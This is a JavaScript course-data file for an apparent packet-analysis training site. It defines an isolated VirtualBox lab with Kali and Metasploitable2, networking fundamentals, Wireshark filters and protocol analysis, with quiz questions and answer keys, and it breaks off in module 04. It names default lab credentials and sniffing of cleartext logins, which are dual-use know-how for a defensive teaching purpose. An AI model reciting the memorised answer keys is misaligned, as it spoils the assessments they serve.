/**
 * Packet Ninja Academy - Complete Course Data & Interactive Lab Scenarios
 * Contains full curriculum for Modules 00 - 11, Glossary, Cheat Sheets & PCAP frames.
 */

window.COURSE_DATA = {
  ranks: [
    { name: "Packet Plankton", icon: "🐟", minXp: 0, maxXp: 499, title: "Beginner", desc: "Setting up home lab & learning network frames" },
    { name: "Frame Fish", icon: "🐠", minXp: 500, maxXp: 1499, title: "Practitioner", desc: "Decoding OSI layers & writing display filters" },
    { name: "Protocol Dolphin", icon: "🐬", minXp: 1500, maxXp: 2999, title: "Analyst", desc: "Deep packet analysis (TCP, TLS, DNS, DHCP)" },
    { name: "Wire Shark", icon: "🦈", minXp: 3000, maxXp: 4499, title: "Professional", desc: "IDS rule writing (Snort 3) & attack detection" },
    { name: "Packet Ninja", icon: "🐉", minXp: 4500, maxXp: 99999, title: "Master", desc: "Completed Capstone & Certified Packet Ninja" }
  ],

  modules: [
    {
      id: "mod-00",
      num: "00",
      title: "Home Lab Setup",
      shortTitle: "Lab Setup",
      icon: "🏠",
      level: "Beginner",
      levelClass: "beginner",
      estTime: "3–4 h",
      totalXp: 350,
      description: "Build an isolated VirtualBox multi-VM sandbox with Kali Linux, Ubuntu Server (Snort 3), Metasploitable2, and a Windows client.",
      worksheets: [
        {
          id: "w-00-01",
          title: "01: Lab Architecture",
          xp: 50,
          objectives: [
            "Understand the isolated 'labnet' internal network topology",
            "Configure host-only and NAT networking safely without leaking packets",
            "Establish IP addressing scheme (10.10.10.0/24)"
          ],
          content: `
            <p>To safely conduct network packet analysis, port scanning, and exploit detection, all tests must run in an <strong>isolated sandbox</strong>.</p>
            <div class="ascii-diagram">
                   Host PC (Windows / Linux / Mac) + VirtualBox 7.x
                                         │
             Internal Network "labnet"  10.10.10.0/24  (Promiscuous: Allow All)
   ┌──────────────────────┬──────────────────────┴──────────────────────┬─────────────────────┐
   │                      │                                             │                     │
 kali                  ubuntu-srv                                metasploitable2       win-client (optional)
 10.10.10.10           10.10.10.20                               10.10.10.30           10.10.10.40
 Analyst / Attacker    Web, DNS, DHCP, FTP + Snort 3 Sensor      Deliberately          Victim Workstation
                       Target Services                           Vulnerable Target     Telemetry
            </div>
            <p><strong>Security Rule:</strong> Metasploitable2 must <em>never</em> have a NAT adapter attached to the Internet. Only <code>labnet</code> is permitted.</p>
          `,
          mission: {
            title: "Plan Your Subnet Topology",
            steps: [
              "Allocate IP addresses: Kali (10.10.10.10), Ubuntu (10.10.10.20), Metasploitable2 (10.10.10.30)",
              "Verify your Host machine has at least 16 GB RAM and Virtualization (VT-x/AMD-V) enabled in UEFI"
            ]
          },
          knowledgeCheck: {
            question: "Why should Metasploitable2 NEVER be connected to a NAT or Bridged adapter with internet access?",
            options: [
              "It consumes too much bandwidth updating packages",
              "It contains intentionally vulnerable unpatched services that can be compromised from the internet in minutes",
              "VirtualBox does not support NAT for Linux 2.6 kernels",
              "It will cause IP conflicts with your home router"
            ],
            correct: 1,
            explanation: "Metasploitable2 contains dozens of remote root vulnerabilities (vsftpd backdoor, unauthenticated rsh, Tomcat default credentials). Connecting it to the public Internet will lead to immediate automated botnet compromise."
          }
        },
        {
          id: "w-00-02",
          title: "02: VirtualBox & Networking",
          xp: 75,
          objectives: [
            "Configure 'Internal Network' adapter mode in VirtualBox",
            "Set Promiscuous Mode to 'Allow All' for sniffing",
            "Test communication across the internal switch"
          ],
          content: `
            <p>In VirtualBox, the <strong>Internal Network</strong> mode acts as an isolated software switch. Setting <strong>Promiscuous Mode: Allow All</strong> allows Wireshark on Kali to sniff all broadcast, multicast, and unicast frames routed through the virtual switch.</p>
            <div class="code-box">
              <span class="code-header">VBoxManage CLI Command</span>
              <code>VBoxManage modifyvm "kali" --nic1 intnet --intnet1 "labnet" --nicpromisc1 allow-all</code>
            </div>
          `,
          mission: {
            title: "Enable Promiscuous Sniffing",
            steps: [
              "Open VirtualBox VM Settings -> Network -> Adapter 1",
              "Attached to: Internal Network, Name: labnet",
              "Click Advanced -> Promiscuous Mode: Allow All"
            ]
          },
          knowledgeCheck: {
            question: "What does 'Promiscuous Mode: Allow All' enable on a virtual network card?",
            options: [
              "Doubles the network interface speed to 10 Gbps",
              "Allows the network card to pass all intercepted frames to the OS, even if not addressed to its MAC",
              "Permits the VM to bypass host firewall rules",
              "Assigns a static public IP automatically"
            ],
            correct: 1,
            explanation: "In normal mode, a network interface discards frames whose destination MAC does not match its own (except broadcasts). Promiscuous mode passes every frame on the wire to the packet capture engine."
          }
        },
        {
          id: "w-00-03",
          title: "03: Building the VMs",
          xp: 150,
          objectives: [
            "Import Kali Linux OVA & configure static IP",
            "Set up Ubuntu 24.04 Server with LAMP stack",
            "Import and verify Metasploitable2 VM"
          ],
          content: `
            <p>Configure static IP addressing on Kali Linux by modifying <code>/etc/network/interfaces</code> or NetworkManager:</p>
            <div class="code-box">
              <span class="code-header">Kali Static IP Config</span>
              <code>sudo ip addr add 10.10.10.10/24 dev eth0\nsudo ip link set eth0 up\nping -c 2 10.10.10.20</code>
            </div>
          `,
          mission: {
            title: "Deploy Target VM",
            steps: [
              "Import Metasploitable2 vmdk disk into VirtualBox",
              "Log in with default credentials `msfadmin:msfadmin` and run `ip addr show`"
            ]
          },
          knowledgeCheck: {
            question: "Which Linux command displays all configured network interfaces and IP addresses?",
            options: ["netstat -r", "ip addr show (or ip a)", "route -n", "cat /etc/hosts"],
            correct: 1,
            explanation: "'ip addr show' (or shorthand 'ip a') is the modern iproute2 utility for querying IP addresses on Linux interfaces."
          }
        },
        {
          id: "w-00-04",
          title: "04: Verification & Snapshots",
          xp: 75,
          objectives: [
            "Take baseline snapshots of all VMs before testing",
            "Verify ARP table population between VMs",
            "Understand snapshot recovery workflows"
          ],
          content: `
            <p>Always take a <strong>Clean Baseline</strong> snapshot of every VM before executing attacks or modifying Snort rules. This allows instant 5-second rollbacks after destructive testing.</p>
          `,
          mission: {
            title: "Snapshot Creation",
            steps: [
              "Power off all lab VMs",
              "Take a snapshot named 'Clean Baseline - Ready for Lab 01'"
            ]
          },
          knowledgeCheck: {
            question: "Why should you take snapshots when the VM is powered OFF rather than running?",
            options: [
              "Powered-off snapshots save disk space and eliminate memory state corruption risks",
              "VirtualBox does not allow snapshots of running VMs",
              "Powered-off snapshots delete previous log files",
              "Running snapshots disable network adapters"
            ],
            correct: 0,
            explanation: "Powered-off snapshots do not need to dump gigabytes of active RAM state to disk, making them substantially smaller, faster, and immune to memory state corruption."
          }
        }
      ]
    },
    {
      id: "mod-01",
      num: "01",
      title: "Networking Fundamentals",
      shortTitle: "Networking",
      icon: "🌐",
      level: "Beginner",
      levelClass: "beginner",
      estTime: "6–8 h",
      totalXp: 475,
      description: "Master the 7 layers of the OSI model, TCP/IP encapsulation, IPv4 addressing, CIDR subnetting, ports, and socket connections.",
      worksheets: [
        {
          id: "w-01-01",
          title: "01: What Is a Network?",
          xp: 50,
          objectives: [
            "Define packet vs frame vs segment",
            "Understand unicast, multicast, and broadcast communication",
            "Understand duplex modes and collision domains"
          ],
          content: `
            <p>Computer networks exchange data broken into manageable chunks called <strong>Protocol Data Units (PDUs)</strong>:</p>
            <ul>
              <li><strong>Layer 2 PDU:</strong> Frame (MAC addressed)</li>
              <li><strong>Layer 3 PDU:</strong> Packet (IP addressed)</li>
              <li><strong>Layer 4 PDU:</strong> Segment (TCP, port addressed) or Datagram (UDP)</li>
            </ul>
          `,
          mission: {
            title: "Inspect Local Interfaces",
            steps: ["Run `ip link` on Linux to view MAC addresses and MTU values."]
          },
          knowledgeCheck: {
            question: "What is the Protocol Data Unit (PDU) at Layer 2 (Data Link)?",
            options: ["Packet", "Segment", "Frame", "Bit"],
            correct: 2,
            explanation: "Layer 2 uses Frames with source and destination MAC addresses and a Frame Check Sequence (FCS)."
          }
        },
        {
          id: "w-01-02",
          title: "02: The OSI Model",
          xp: 100,
          objectives: [
            "Memorize all 7 layers (All People Seem To Need Data Processing)",
            "Map Wireshark packet details pane directly to OSI layers",
            "Apply OSI layers for divide-and-conquer troubleshooting"
          ],
          content: `
            <div class="osi-table-container">
              <table class="data-table">
                <thead>
                  <tr><th>#</th><th>Layer</th><th>Purpose</th><th>PDU</th><th>Addressing</th><th>Protocols</th></tr>
                </thead>
                <tbody>
                  <tr><td>7</td><td>Application</td><td>User network services</td><td>Data</td><td>URL/Hostname</td><td>HTTP, DNS, SSH, DHCP</td></tr>
                  <tr><td>6</td><td>Presentation</td><td>Encoding & encryption</td><td>Data</td><td>MIME/Format</td><td>TLS, JPEG, UTF-8</td></tr>
                  <tr><td>5</td><td>Session</td><td>Session dialog control</td><td>Data</td><td>Session ID</td><td>RPC, NetBIOS</td></tr>
                  <tr><td>4</td><td>Transport</td><td>End-to-end ports & reliability</td><td>Segment/Datagram</td><td>Port (0–65535)</td><td>TCP, UDP</td></tr>
                  <tr><td>3</td><td>Network</td><td>Logical routing & path selection</td><td>Packet</td><td>IP Address</td><td>IPv4, IPv6, ICMP</td></tr>
                  <tr><td>2</td><td>Data Link</td><td>Node-to-node hop delivery</td><td>Frame</td><td>MAC Address</td><td>Ethernet, ARP, 802.1Q</td></tr>
                  <tr><td>1</td><td>Physical</td><td>Raw electrical/optical bitstream</td><td>Bits</td><td>Pins/Cables</td><td>1000BASE-T, Cat6, Fiber</td></tr>
                </tbody>
              </table>
            </div>
          `,
          mission: {
            title: "Trace Layers in Wireshark",
            steps: [
              "Capture a single HTTP packet in Wireshark",
              "Expand each header item in the Packet Details pane to verify the 7-layer stack"
            ]
          },
          knowledgeCheck: {
            question: "At which layer does a stateful firewall inspect TCP port numbers?",
            options: ["Layer 2 (Data Link)", "Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)"],
            correct: 2,
            explanation: "Ports (TCP/UDP) belong to Layer 4 (Transport Layer). Stateful firewalls inspect Layer 4 headers to track connection states."
          }
        },
        {
          id: "w-01-03",
          title: "03: TCP/IP & Encapsulation",
          xp: 100,
          objectives: [
            "Understand header prepend encapsulation and decapsulation",
            "Map OSI 7 layers to the practical 4-layer TCP/IP stack",
            "Recognize EtherType and Protocol numbers in packet headers"
          ],
          content: `
            <p>During transmission, data is wrapped in headers as it travels down the stack: <strong>Application Data -> TCP Segment -> IP Packet -> Ethernet Frame</strong>.</p>
            <div class="ascii-diagram">
[ Ethernet Header (14B) ][ IP Header (20B) ][ TCP Header (20B) ][ Application Payload ][ FCS (4B) ]
└──────────── Layer 2 ───┴───── Layer 3 ───┴───── Layer 4 ───┴────── Layer 7 ────────┴── L2 Trailer ─┘
            </div>
          `,
          mission: {
            title: "Verify Encapsulation",
            steps: ["Identify EtherType `0x0800` (IPv4) in the Ethernet frame header using Wireshark."]
          },
          knowledgeCheck: {
            question: "What EtherType hexadecimal value designates an encapsulated IPv4 packet?",
            options: ["0x0806", "0x0800", "0x86DD", "0x8100"],
            correct: 1,
            explanation: "0x0800 designates IPv4. 0x0806 is ARP, 0x86DD is IPv6, and 0x8100 is 802.1Q VLAN tagging."
          }
        },
        {
          id: "w-01-04",
          title: "04: IP Addressing & Subnetting",
          xp: 150,
          objectives: [
            "Calculate CIDR prefixes, subnet masks, and broadcast addresses",
            "Identify RFC 1918 private IPv4 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "Determine total usable hosts using the formula 2^(32 - prefix) - 2"
          ],
          content: `
            <p>Subnetting splits a network into broadcast domains. For a <code>/24</code> subnet (mask <code>255.255.255.0</code>), there are 8 host bits: <code>2^8 - 2 = 254</code> usable host addresses.</p>
            <div class="code-box">
              <span class="code-header">CIDR Quick Reference</span>
              <code>/24 -> 255.255.255.0   (254 hosts)\n/25 -> 255.255.255.128 (126 hosts)\n/26 -> 255.255.255.192 (62 hosts)\n/28 -> 255.255.255.240 (14 hosts)\n/30 -> 255.255.255.252 (2 point-to-point hosts)</code>
            </div>
          `,
          mission: {
            title: "Calculate Subnet Range",
            steps: ["Use our built-in CIDR Calculator tool to analyze `10.10.10.0/24`."]
          },
          knowledgeCheck: {
            question: "How many usable host IP addresses are available in a /28 subnet?",
            options: ["16", "14", "30", "6"],
            correct: 1,
            explanation: "32 - 28 = 4 host bits. 2^4 = 16 total IPs. Subtract 2 (network address and broadcast address) = 14 usable hosts."
          }
        },
        {
          id: "w-01-05",
          title: "05: Ports, Protocols & Sockets",
          xp: 75,
          objectives: [
            "Distinguish Well-Known (0–1023), Registered (1024–49151), and Ephemeral (49152–65535) ports",
            "Define a network socket as IP Address + Port Number",
            "Inspect listening sockets using `ss` and `netstat`"
          ],
          content: `
            <p>A network socket is defined as the combination of an <strong>IP address and a port number</strong> (e.g. <code>10.10.10.20:80</code>). Communication between two endpoints forms a <strong>Five-Tuple</strong>: Source IP, Source Port, Destination IP, Destination Port, and Protocol.</p>
            <div class="code-box">
              <span class="code-header">Inspect Listening Ports on Linux</span>
              <code>sudo ss -tulpn</code>
            </div>
          `,
          mission: {
            title: "Map Listening Sockets",
            steps: ["Run `ss -tulpn` on Kali or Ubuntu to list active listening TCP/UDP sockets."]
          },
          knowledgeCheck: {
            question: "Which port range is designated by IANA for Ephemeral (client dynamic) ports?",
            options: ["0 – 1023", "1024 – 49151", "49152 – 65535", "1 – 65535"],
            correct: 2,
            explanation: "49152 through 65535 is the standard IANA dynamic/private/ephemeral port range allocated temporarily for outbound client connections."
          }
        }
      ]
    },
    {
      id: "mod-02",
      num: "02",
      title: "Wireshark Foundations",
      shortTitle: "Wireshark",
      icon: "🔍",
      level: "Beginner",
      levelClass: "beginner",
      estTime: "5–6 h",
      totalXp: 450,
      description: "Learn the Wireshark GUI, capture interfaces, BPF capture filters vs display filters, coloring rules, and custom columns.",
      worksheets: [
        {
          id: "w-02-01",
          title: "01: Install & Interface Tour",
          xp: 75,
          objectives: [
            "Navigate the 3 core panes: Packet List, Packet Details, and Packet Bytes (Hex/ASCII)",
            "Configure Wireshark permissions without running as root via `dumpcap`",
            "Understand the status bar (Packets Captured, Displayed, Profile)"
          ],
          content: `
            <p>Wireshark organizes packet inspection into three primary views:</p>
            <ol>
              <li><strong>Packet List Pane:</strong> High-level summary table (No., Time, Source, Destination, Protocol, Length, Info).</li>
              <li><strong>Packet Details Pane:</strong> Collapsible protocol tree showing fields, flags, and values decoded layer-by-layer.</li>
              <li><strong>Packet Bytes Pane:</strong> Raw hexadecimal and ASCII character representation on the wire.</li>
            </ol>
          `,
          mission: {
            title: "Interface Customization",
            steps: ["Launch Wireshark, select your interface, and enable 'View -> Zoom In'."]
          },
          knowledgeCheck: {
            question: "Why is it considered a security risk to launch the full Wireshark GUI as the root user?",
            options: [
              "Wireshark cannot save PCAP files as root",
              "Wireshark contains millions of lines of protocol dissector code that could execute malicious packet payloads with root privileges",
              "Root mode disables promiscuous capture",
              "Wireshark requires a graphical display that root cannot access"
            ],
            correct: 1,
            explanation: "Wireshark has hundreds of dissectors parsing untrusted network inputs. A vulnerability in any dissector could yield remote code execution as root. Instead, use 'dumpcap' with network capture capabilities (`CAP_NET_RAW`)."
          }
        },
        {
          id: "w-02-02",
          title: "02: Capturing Traffic",
          xp: 75,
          objectives: [
            "Start, pause, and stop live packet captures",
            "Configure ring buffer capture options to prevent disk exhaustion",
            "Save and export packet captures in `.pcapng` format"
          ],
          content: `
            <p>When capturing live enterprise traffic, captures can fill disks in minutes. Use <strong>Ring Buffers</strong>:</p>
            <div class="code-box">
              <span class="code-header">Ring Buffer Capture CLI (dumpcap)</span>
              <code>dumpcap -i eth0 -b filesize:50000 -b files:10 -w /tmp/capture.pcapng</code>
            </div>
            <p>This creates up to 10 files of 50 MB each, automatically rotating and overwriting the oldest file.</p>
          `,
          mission: {
            title: "Execute a Ring Buffer Capture",
            steps: ["Configure a 5-file ring buffer in Capture -> Options -> Output."]
          },
          knowledgeCheck: {
            question: "What is the primary advantage of the newer .pcapng format over legacy .pcap?",
            options: [
              "pcapng encrypts packet contents with AES-256",
              "pcapng supports capturing from multiple interfaces simultaneously, metadata comments, and interface statistics",
              "pcapng is half the file size of pcap",
              "pcapng can only be opened by Snort"
            ],
            correct: 1,
            explanation: "pcapng (Next Generation) supports multiple interfaces, packet drop statistics per interface, user comments per packet, and hardware timestamps."
          }
        },
        {
          id: "w-02-03",
          title: "03: Capture Filters (BPF)",
          xp: 100,
          objectives: [
            "Write Berkeley Packet Filter (BPF) syntax for pre-capture kernel filtering",
            "Differentiate Capture Filters (discarded at kernel) vs Display Filters (applied in memory)",
            "Filter by host, subnet, port range, and protocol"
          ],
          content: `
            <div class="comparison-box">
              <div class="col">
                <h4>Capture Filter (BPF)</h4>
                <ul>
                  <li>Applied in kernel via libpcap BEFORE packets reach Wireshark</li>
                  <li>Unmatched packets are permanently discarded</li>
                  <li>Saves CPU & RAM during high-traffic captures</li>
                  <li>Syntax: <code>host 10.10.10.20 and port 80</code></li>
                </ul>
              </div>
              <div class="col">
                <h4>Display Filter</h4>
                <ul>
                  <li>Applied in Wireshark memory AFTER packets are captured</li>
                  <li>Packets remain in the file; only visible view is changed</li>
                  <li>Rich field inspection (flags, URIs, payloads)</li>
                  <li>Syntax: <code>ip.addr == 10.10.10.20 && tcp.port == 80</code></li>
                </ul>
              </div>
            </div>
          `,
          mission: {
            title: "Set BPF Filter",
            steps: ["In Wireshark capture options, enter `host 10.10.10.20 and not port 22` to exclude SSH traffic."]
          },
          knowledgeCheck: {
            question: "Which of the following is a valid BPF Capture Filter?",
            options: [
              "ip.addr == 10.10.10.20 && tcp.flags.syn == 1",
              "tcp port 443 and src net 192.168.1.0/24",
              "http.request.method == 'GET'",
              "frame.len > 1500"
            ],
            correct: 1,
            explanation: "'tcp port 443 and src net 192.168.1.0/24' uses valid BPF syntax. The others are Wireshark Display Filters."
          }
        },
        {
          id: "w-02-04",
          title: "04: Display Filters",
          xp: 150,
          objectives: [
            "Master comparison operators (`==`, `!=`, `>`, `<`, `contains`, `matches`, `in`)",
            "Combine filters with logical boolean operators (`&&`, `||`, `!`)",
            "Filter on protocol-specific flags (e.g. `tcp.flags.syn == 1 && tcp.flags.ack == 0`)"
          ],
          content: `
            <p>Display filters are the primary tool for isolating needle-in-a-haystack security events:</p>
            <div class="code-box">
              <span class="code-header">Essential Display Filters</span>
              <code>ip.addr == 10.10.10.20                    # Conversations involving host\ntcp.flags.syn == 1 && tcp.flags.ack == 0 # SYN stealth scan / connection attempts\nhttp.request.method in {"GET", "POST"}   # Web traffic requests\ndns.flags.rcode != 0                     # DNS error responses (NXDOMAIN)\narp.duplicate-address-detected           # ARP poisoning / IP conflict!</code>
            </div>
          `,
          mission: {
            title: "Test Display Filters",
            steps: ["Try our live interactive Wireshark Filter Sandbox tool on this page to test filter queries."]
          },
          knowledgeCheck: {
            question: "What does the display filter 'tcp.flags.reset == 1' isolate?",
            options: [
              "Successful 3-way handshakes",
              "Connections aborted or refused by a host/firewall (RST packet)",
              "Packets with corrupted checksums",
              "HTTP redirects"
            ],
            correct: 1,
            explanation: "The TCP RST (Reset) flag immediately aborts a connection or indicates a closed port when returned in response to an initial SYN packet."
          }
        },
        {
          id: "w-02-05",
          title: "05: Profiles, Columns & Coloring",
          xp: 75,
          objectives: [
            "Add custom columns for Delta Time, TCP Stream ID, and Host header",
            "Create dedicated Configuration Profiles (Security Analyst, Troubleshooting)",
            "Create high-contrast custom coloring rules for security alerts"
          ],
          content: `
            <p>Customize your analyst workflow: Right-click any decoded field in the Packet Details pane and choose <strong>Apply as Column</strong>. Add columns for <code>tcp.stream</code> and <code>http.host</code> to drastically speed up analysis.</p>
          `,
          mission: {
            title: "Create Analyst Profile",
            steps: ["Create a custom profile in Edit -> Configuration Profiles called 'Threat Hunting'."]
          },
          knowledgeCheck: {
            question: "Why is adding the 'tcp.stream' column valuable during security investigations?",
            options: [
              "It automatically decrypts encrypted TLS traffic",
              "It tags all packets belonging to the same TCP conversation with an integer index, making session isolation effortless",
              "It speeds up NIC hardware capture",
              "It prevents packet dropping"
            ],
            correct: 1,
            explanation: "Wireshark indexes each unique bidirectional TCP socket conversation with an incremental stream index (0, 1, 2...). Filtering by 'tcp.stream eq X' isolates that entire session."
          }
        }
      ]
    },
    {
      id: "mod-03",
      num: "03",
      title: "Protocol Analysis",
      shortTitle: "Protocols",
      icon: "🔬",
      level: "Intermediate",
      levelClass: "intermediate",
      estTime: "10–12 h",
      totalXp: 950,
      description: "Deep dive packet inspection: Ethernet, ARP, IPv4, ICMP, TCP 3-way handshake, UDP, DNS queries, DHCP DORA, and HTTP/TLS.",
      worksheets: [
        {
          id: "w-03-01",
          title: "01: Ethernet & ARP",
          xp: 100,
          objectives: [
            "Analyze Ethernet II 14-byte headers (Src MAC, Dst MAC, EtherType)",
            "Trace ARP Request (Broadcast) and ARP Reply (Unicast)",
            "Identify Gratuitous ARP (GARP) and spoofing indicators"
          ],
          content: `
            <p><strong>ARP (Address Resolution Protocol - RFC 826):</strong> Resolves a known Layer 3 IPv4 address to an unknown Layer 2 MAC address on the local link.</p>
            <div class="ascii-diagram">
Host A (10.10.10.10) ──── Broadcast (ff:ff:ff:ff:ff:ff) ────► "Who has 10.10.10.20? Tell 10.10.10.10"
Host B (10.10.10.20) ──── Unicast to Host A MAC ────────────► "10.10.10.20 is at 08:00:27:aa:bb:cc"
            </div>
          `,
          mission: {
            title: "Capture ARP Transaction",
            steps: ["Clear local ARP cache with `sudo ip neigh flush all`, then ping 10.10.10.20 while capturing in Wireshark."]
          },
          knowledgeCheck: {
            question: "What destination MAC address is used in an ARP Request?",
            options: ["00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff", "127.0.0.1", "08:00:27:00:00:00"],
            correct: 1,
            explanation: "ARP Requests are broadcast to all devices on the Layer 2 local broadcast domain using ff:ff:ff:ff:ff:ff."
          }
        },
        {
          id: "w-03-02",
          title: "02: IP & ICMP",
          xp: 100,
          objectives: [
            "Dissect IPv4 header: Version, IHL, DSCP, Total Length, TTL, Protocol, Checksum",
            "Understand Time-to-Live (TTL) decrementation and traceroute mechanics",
            "Inspect ICMP Type 8 (Echo Request) and Type 0 (Echo Reply)"
          ],
          content: `
            <p>Every router hop decrements the IPv4 <strong>TTL (Time-to-Live)</strong> by 1. When TTL reaches 0, the router drops the packet and responds with <strong>ICMP Type 11 (Time Exceeded)</strong>—the fundamental principle enabling <code>traceroute</code>.</p>
          `,
          mission: {
            title: "Traceroute Decapsulation",
            steps: ["Run `traceroute 10.10.10.20` and observe the incrementing TTL values in Wireshark."]
          },
          knowledgeCheck: {
            question: "Which ICMP Type and Code designates a 'Destination Host Unreachable' message?",
            options: ["Type 8, Code 0", "Type 0, Code 0", "Type 3, Code 1", "Type 11, Code 0"],
            correct: 2,
            explanation: "ICMP Type 3 is Destination Unreachable. Code 1 is 'Host Unreachable' (Code 0 is Net Unreachable, Code 3 is Port Unreachable)."
          }
        },
        {
          id: "w-03-03",
          title: "03: TCP Deep Dive",
          xp: 200,
          objectives: [
            "Deconstruct the TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK)",
            "Track Sequence (SEQ) and Acknowledgment (ACK) relative vs absolute numbers",
            "Inspect TCP flags: SYN, ACK, FIN, RST, PSH, URG",
            "Analyze TCP Sliding Window flow control"
          ],
          content: `
            <p>TCP provides reliable, ordered, error-checked delivery of a stream of octets. The 3-way handshake initializes sequence tracking:</p>
            <div class="ascii-diagram">
Client (10.10.10.10)                                          Server (10.10.10.20)
       │                                                             │
       │─── [SYN] Seq=0 (ISN_c) ────────────────────────────────────►│ (SYN_RCVD)
       │                                                             │
       │◄── [SYN, ACK] Seq=0 (ISN_s), Ack=1 (ISN_c + 1) ─────────────│
       │                                                             │
       │─── [ACK] Seq=1, Ack=1 (ISN_s + 1) ─────────────────────────►│ (ESTABLISHED)
            </div>
          `,
          mission: {
            title: "Follow TCP Stream",
            steps: ["Capture an HTTP transaction, right-click any TCP packet, and select 'Follow -> TCP Stream'."]
          },
          knowledgeCheck: {
            question: "If a client sends an initial SYN with Sequence Number 1000, what will the server's Acknowledgment Number be in the SYN-ACK?",
            options: ["1000", "1001", "0", "2000"],
            correct: 1,
            explanation: "The ACK number tells the sender the next byte expected. Since the SYN flag consumes 1 sequence number, ACK = 1000 + 1 = 1001."
          }
        },
        {
          id: "w-03-04",
          title: "04: UDP & DNS",
          xp: 150,
          objectives: [
            "Contrast lightweight 8-byte UDP header vs TCP overhead",
            "Dissect DNS query structure (Transaction ID, Flags, Questions, Resource Records)",
            "Detect DNS exfiltration and tunneling through oversized TXT queries"
          ],
          content: `
            <p>UDP is connectionless and header-minimal (only 8 bytes: Source Port, Destination Port, Length, Checksum). DNS queries run over UDP port 53. Adversaries frequently abuse DNS for command-and-control (C2) tunneling by encoding base64 payloads into subdomains or TXT records.</p>
          `,
          mission: {
            title: "Inspect DNS Queries",
            steps: ["Run `dig @10.10.10.20 secret.labnet TXT` and inspect the DNS response records in Wireshark."]
          },
          knowledgeCheck: {
            question: "What DNS Response Code (RCODE) indicates that the queried domain name does not exist?",
            options: ["0 (NOERROR)", "2 (SERVFAIL)", "3 (NXDOMAIN)", "5 (REFUSED)"],
            correct: 2,
            explanation: "RCODE 3 is NXDOMAIN (Non-Existent Domain). High volumes of NXDOMAIN errors often indicate DGA (Domain Generation Algorithm) malware."
          }
        },
        {
          id: "w-03-05",
          title: "05: DHCP (DORA)",
          xp: 100,
          objectives: [
            "Analyze the 4-step DHCP process: Discover, Offer, Request, Acknowledge",
            "Examine DHCP Options (Subnet Mask, Router, DNS Servers, Lease Time)",
            "Identify Rogue DHCP servers and starvation attacks"
          ],
          content: `
            <p>DHCP lease negotiation follows the <strong>DORA</strong> process across UDP ports 67 (Server) and 68 (Client):</p>
            <ol>
              <li><strong>Discover:</strong> Client broadcasts to locate DHCP servers (<code>0.0.0.0:68 -&gt; 255.255.255.255:67</code>).</li>
              <li><strong>Offer:</strong> Server proposes an IP lease with network parameters.</li>
              <li><strong>Request:</strong> Client formally requests the offered IP.</li>
              <li><strong>ACK:</strong> Server confirms the lease allocation.</li>
            </ol>
          `,
          mission: {
            title: "Capture DHCP DORA",
            steps: ["Run `sudo dhclient -r eth0 && sudo dhclient eth0` on Kali and filter by `bootp` or `dhcp`."]
          },
          knowledgeCheck: {
            question: "Which switch security feature prevents Rogue DHCP server attacks on enterprise access ports?",
            options: ["Port Security", "DHCP Snooping", "Dynamic ARP Inspection (DAI)", "BPDU Guard"],
            correct: 1,
            explanation: "DHCP Snooping designates switch ports as trusted or untrusted. Only trusted uplink ports connected to legitimate DHCP servers can transmit DHCP Offer and ACK frames."
          }
        },
        {
          id: "w-03-06",
          title: "06: HTTP & TLS",
          xp: 200,
          objectives: [
            "Inspect unencrypted HTTP request methods (GET, POST), headers, and cookies",
            "Extract cleartext login credentials from HTTP POST forms",
            "Dissect TLS 1.2 / 1.3 Handshake (Client Hello, Server Name Indication, Certificates)"
          ],
          content: `
            <p>Plaintext HTTP over port 80 exposes passwords, session cookies, and sensitive payloads to anyone sniffing the network segment. TLS encrypts this traffic, but metadata like the <strong>Server Name Indication (SNI)</strong> in the Client Hello remains visible in cleartext unless ECH (Encrypted Client Hello) is utilized.</p>
          `,
          mission: {
            title: "Inspect SNI in TLS Client Hello",
            steps: ["Filter by `tls.handshake.type == 1` and locate the Server Name Indication extension field."]
          },
          knowledgeCheck: {
            question: "Which Wireshark filter isolates HTTP requests submitting form data with the POST method?",
            options: [
              "http.request.method == 'POST'",
              "http.post.data == true",
              "tcp.port == 80 and post",
              "http.response.code == 200"
            ],
            correct: 0,
            explanation: "http.request.method == 'POST' specifically matches all HTTP client requests transmitting POST payloads."
          }
        }
      ]
    },
    {
      id: "mod-04",
      num: "04",
      title: "Advanced Wireshark & TShark",
      shortTitle: "Adv Wireshark",
      icon: "⚡",
      level: "Intermediate",
      levelClass: "intermediate",
      estTime: "8–10 h",
      totalXp: 700,
      description: "Master I/O graphs, TCP stream reassembly, file object extraction, command-line TShark automation, and TLS decryption with SSLKEYLOGFILE.",
      worksheets: [
        {
          id: "w-04-01",
          title: "01: Statistics & I/O Graphs",
          xp: 100,
          objectives: [
            "Generate I/O Graphs showing packets/sec and throughput bursts",
            "Identify bandwidth bottlenecks and DDoS flood spikes",
            "Analyze Protocol Hierarchy statistics"
          ],
          content: `
            <p>Wireshark's <strong>I/O Graphs</strong> (Statistics -> I/O Graphs) allow security analysts to visualize traffic bursts, bandwidth anomalies, and SYN flood spikes over time without reading individual packets.</p>
          `,
          mission: {
            title: "Plot TCP Retransmissions",
            steps: ["Open Statistics -> I/O Graphs and add a graph for `tcp.analysis.retransmission`."]
          },
          knowledgeCheck: {
            question: "What does a sudden spike in 'tcp.analysis.retransmission' packets indicate?",
            options: [
              "The network interface speed increased",
              "Severe packet loss, congested buffers, or network link degradation",
              "A successful TLS handshake",
              "DNS cache poisoning"
            ],
            correct: 1,
            explanation: "TCP retransmissions occur when ACKs are not received before the retransmission timeout (RTO), signaling packet drops or network congestion."
          }
        },
        {
          id: "w-04-02",
          title: "02: Streams & Object Extraction",
          xp: 100,
          objectives: [
            "Reassemble full TCP conversations into ASCII/Hex streams",
            "Extract transferred files (EXEs, PDFs, images) via File -> Export Objects -> HTTP",
            "Reconstruct malware downloads from packet captures"
          ],
          content: `
            <p>Wireshark automatically reassembles fragmented TCP packets into complete application payloads. Navigate to <strong>File -> Export Objects -> HTTP</strong> to dump files transferred over unencrypted sessions directly to disk for antivirus/YARA scanning.</p>
          `,
          mission: {
            title: "Export File Object",
            steps: ["Open a capture with HTTP file downloads and export the transferred binary to `/tmp/extracted_file`."]
          },
          knowledgeCheck: {
            question: "Where can you extract files transferred over unencrypted HTTP sessions in Wireshark?",
            options: [
              "Edit -> Preferences -> Protocols",
              "File -> Export Objects -> HTTP",
              "Statistics -> Conversations",
              "Tools -> Firewall ACL Rules"
            ],
